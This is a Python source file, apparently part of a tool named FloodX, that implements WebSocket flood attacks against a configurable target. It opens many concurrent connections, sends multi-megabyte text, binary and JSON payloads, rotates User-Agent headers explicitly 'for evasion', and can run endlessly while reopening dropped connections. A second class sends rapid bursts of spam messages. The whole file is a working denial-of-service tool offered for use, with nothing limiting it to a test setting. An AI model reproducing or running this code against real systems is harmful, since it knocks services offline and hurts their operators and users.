"""
FloodX: WebSocket Storm Attack Implementation
High-volume WebSocket connection and message flooding.
"""

import asyncio
import json
import random
import time
import websockets
from typing import Dict, Any, List
from urllib.parse import urlparse

from common.logger import logger, stats_logger
from config import USER_AGENTS


class WebSocketStorm:
    """WebSocket flood attack with MASSIVE PAYLOAD connection and message spam."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config.get('port', 8080)  # Default port for WebSocket
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.connections = []
        self.messages_sent = 0
        self.connections_made = 0
        self.error_count = 0
        
        # Build WebSocket URL
        ws_scheme = 'wss' if self.port == 443 else 'ws'
        self.ws_url = f"{ws_scheme}://{self.target}:{self.port}/"
        
        # MASSIVE PAYLOAD message types for maximum data transmission
        self.message_types = [
            'massive_text',
            'massive_binary', 
            'massive_json',
            'ping_flood',
            'huge_payload',
            'binary_bomb',
            'json_explosion'
        ]
        
        # Generate massive payloads for WebSocket flooding
        self.generate_massive_websocket_payloads()
        
    def generate_massive_websocket_payloads(self):
        """Generate massive WebSocket payloads for maximum data transmission."""
        logger.info("🚀 Generating MASSIVE WebSocket payloads for overwhelming data transmission...")
        
        # Massive payload sizes (MB range per message)
        self.payload_sizes = [
            1024 * 1024,      # 1 MB
            5 * 1024 * 1024,  # 5 MB
            10 * 1024 * 1024, # 10 MB  
            50 * 1024 * 1024, # 50 MB
        ]
        
        # Pre-generate massive payloads
        self.massive_payloads = {}
        
        # Massive text payload
        self.massive_payloads['text'] = 'DDOS_WEBSOCKET_FLOOD_' * (1024 * 100)  # ~2MB
        
        # Massive binary payload
        self.massive_payloads['binary'] = bytes([i % 256 for i in range(1024 * 1024)])  # 1MB binary
        
        # Massive JSON payload
        massive_json_data = {
            'attack': 'websocket_flood',
            'payload': 'X' * (1024 * 500),  # 500KB string
            'data': ['flood_data_' + str(i) for i in range(10000)],  # 10k items
            'massive_object': {f'key_{i}': 'value_' + 'X' * 100 for i in range(1000)}  # 1k key-value pairs
        }
        self.massive_payloads['json'] = json.dumps(massive_json_data)
        
        # Ultra massive payload for maximum impact
        self.massive_payloads['ultra'] = b'ULTRA_MASSIVE_WEBSOCKET_PAYLOAD_' * (1024 * 1024)  # ~30MB
        
        logger.info(f"💥 Generated {len(self.massive_payloads)} massive WebSocket payload types")
        logger.info(f"🎯 Largest payload: {len(self.massive_payloads['ultra']) // (1024*1024)} MB per message")
        
    async def run(self):
        """Execute the WebSocket storm attack."""
        logger.info(f"🔌 Starting WebSocket storm: {self.concurrency} connections for {self.duration}s")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create semaphore for connection limit
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch connection tasks
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._websocket_worker(semaphore, i))
                tasks.append(task)
            
            # Monitor attack progress
            if self.duration > 0:
                # Duration-based mode
                while self.running and (time.time() - start_time) < self.duration:
                    await asyncio.sleep(1)
                    
                    # Log progress every 10 seconds
                    if int(time.time() - start_time) % 10 == 0:
                        active_connections = len([t for t in tasks if not t.done()])
                        logger.info(f"🔌 WebSocket: {active_connections} active, {self.messages_sent} messages sent")
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        await asyncio.sleep(30)  # Report every 30 seconds
                        
                        active_connections = len([t for t in tasks if not t.done()])
                        logger.info(f"🔌 WebSocket: {active_connections} active, {self.messages_sent} messages sent")
                        
                        # Restart connections if they died (continuous operation)
                        if active_connections < self.concurrency * 0.3:
                            logger.info("🔄 Restarting WebSocket connections for continuous operation...")
                            
                            # Cancel dead tasks
                            active_tasks = [t for t in tasks if not t.done()]
                            for task in tasks:
                                if task.done():
                                    task.cancel()
                            
                            # Start new connections to replace dead ones
                            tasks = active_tasks
                            needed_connections = self.concurrency - len(active_tasks)
                            for i in range(needed_connections):
                                task = asyncio.create_task(self._websocket_worker(semaphore, len(tasks) + i))
                                tasks.append(task)
                                
                except KeyboardInterrupt:
                    logger.info("🛑 Endless WebSocket storm stopped by user")
                    self.running = False
            
            # Stop attack
            self.running = False
            
            # Wait for tasks to complete
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ WebSocket storm failed: {e}")
        finally:
            await self._cleanup_connections()
            logger.info(f"✅ WebSocket storm completed: {self.messages_sent} messages, {self.error_count} errors")

    async def _websocket_worker(self, semaphore: asyncio.Semaphore, worker_id: int):
        """Individual WebSocket connection worker."""
        async with semaphore:
            websocket = None
            try:
                # Custom headers for evasion
                headers = {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Origin': f"http://{self.target}",
                    'Sec-WebSocket-Version': '13',
                    'Sec-WebSocket-Extensions': 'permessage-deflate; client_max_window_bits'
                }
                
                # Connect to WebSocket
                websocket = await websockets.connect(
                    self.ws_url,
                    extra_headers=headers,
                    timeout=10,
                    max_size=2**20,  # 1MB max message size
                    max_queue=1000
                )
                
                self.connections_made += 1
                self.connections.append(websocket)
                
                logger.debug(f"🔗 Worker {worker_id}: WebSocket connected to {self.ws_url}")
                
                # Send messages continuously
                while self.running:
                    try:
                        message_type = random.choice(self.message_types)
                        message = await self._generate_message(message_type)
                        
                        if message_type == 'ping':
                            await websocket.ping(message)
                        else:
                            await websocket.send(message)
                        
                        self.messages_sent += 1
                        
                        # Update stats periodically
                        if self.messages_sent % 100 == 0:
                            stats_logger.update_stats(
                                packets_sent=self.messages_sent,
                                connections_established=self.connections_made,
                                errors=self.error_count
                            )
                        
                        # Small delay to prevent overwhelming
                        await asyncio.sleep(random.uniform(0.01, 0.1))
                        
                    except websockets.exceptions.ConnectionClosed:
                        logger.debug(f"🔗 Worker {worker_id}: WebSocket connection closed")
                        break
                    except Exception as e:
                        self.error_count += 1
                        logger.debug(f"❌ Worker {worker_id}: Message send error: {e}")
                        break
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"❌ Worker {worker_id}: WebSocket connection error: {e}")
            finally:
                if websocket:
                    try:
                        await websocket.close()
                        if websocket in self.connections:
                            self.connections.remove(websocket)
                    except:
                        pass

    async def _generate_message(self, message_type: str):
        """Generate MASSIVE WebSocket messages for maximum data transmission."""
        if message_type == 'massive_text':
            # Return massive text payload
            return self.massive_payloads['text']
        
        elif message_type == 'massive_binary':
            # Return massive binary payload  
            return self.massive_payloads['binary']
        
        elif message_type == 'massive_json':
            # Return massive JSON payload
            return self.massive_payloads['json']
        
        elif message_type == 'huge_payload':
            # Return ultra massive payload
            return self.massive_payloads['ultra']
        
        elif message_type == 'binary_bomb':
            # Generate random massive binary bomb
            size = random.choice(self.payload_sizes)
            return bytes([random.randint(0, 255) for _ in range(min(size, 1024*1024))])  # Cap at 1MB for memory
        
        elif message_type == 'json_explosion':
            # Generate massive JSON explosion
            explosion_data = {
                'attack_vector': 'websocket_massive_flood',
                'payload_size': 'maximum',
                'data_bomb': {f'massive_key_{i}': 'X' * 1000 for i in range(1000)},  # 1MB of keys
                'array_flood': ['flood_item_' + 'Y' * 100 for _ in range(5000)],  # 500KB array
                'timestamp': time.time(),
                'ultra_payload': 'Z' * (1024 * 1024)  # 1MB string
            }
            return json.dumps(explosion_data)
        
        elif message_type == 'ping_flood':
            # Massive ping payload
            return b"PING_FLOOD_" + b"X" * (1024 * 100)  # 100KB ping
        
        else:
            # Default to massive text payload
            return self.massive_payloads['text']

    def _generate_random_string(self, length: int) -> str:
        """Generate random string for messages."""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))

    async def _cleanup_connections(self):
        """Cleanup all WebSocket connections."""
        logger.debug("🧹 Cleaning up WebSocket connections")
        
        cleanup_tasks = []
        for websocket in self.connections[:]:
            cleanup_tasks.append(self._close_websocket(websocket))
        
        if cleanup_tasks:
            await asyncio.gather(*cleanup_tasks, return_exceptions=True)
        
        self.connections.clear()

    async def _close_websocket(self, websocket):
        """Close a single WebSocket connection."""
        try:
            await websocket.close()
        except:
            pass

    async def stop(self):
        """Stop the WebSocket storm attack."""
        logger.info("🛑 Stopping WebSocket storm...")
        self.running = False
        await self._cleanup_connections()


class WebSocketSpam:
    """Alternative WebSocket attack focusing on message spam."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        self.duration = config['duration']
        self.concurrency = min(config['concurrency'], 100)  # Limit for spam attack
        
        self.running = False
        self.spam_count = 0
        self.error_count = 0
        
        # Build WebSocket URL
        ws_scheme = 'wss' if self.port == 443 else 'ws'
        self.ws_url = f"{ws_scheme}://{self.target}:{self.port}/"

    async def run(self):
        """Execute WebSocket spam attack with fewer connections but more messages."""
        logger.info(f"📨 Starting WebSocket spam: {self.concurrency} connections with high message rate")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create fewer but more aggressive connections
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._spam_worker(i))
                tasks.append(task)
            
            # Monitor attack
            while self.running and (time.time() - start_time) < self.duration:
                await asyncio.sleep(5)
                logger.info(f"📨 WebSocket spam: {self.spam_count} messages sent")
            
            self.running = False
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ WebSocket spam failed: {e}")
        finally:
            logger.info(f"✅ WebSocket spam completed: {self.spam_count} messages")

    async def _spam_worker(self, worker_id: int):
        """High-frequency message sender."""
        websocket = None
        try:
            websocket = await websockets.connect(self.ws_url, timeout=10)
            
            # Send messages as fast as possible
            while self.running:
                try:
                    # Send rapid-fire messages
                    for _ in range(10):  # Burst of 10 messages
                        if not self.running:
                            break
                        
                        message = f"SPAM_{worker_id}_{self.spam_count}_{time.time()}"
                        await websocket.send(message)
                        self.spam_count += 1
                    
                    # Very short delay between bursts
                    await asyncio.sleep(0.001)
                    
                except websockets.exceptions.ConnectionClosed:
                    break
                except Exception as e:
                    self.error_count += 1
                    break
                    
        except Exception as e:
            self.error_count += 1
            logger.debug(f"❌ Spam worker {worker_id}: {e}")
        finally:
            if websocket:
                try:
                    await websocket.close()
                except:
                    pass
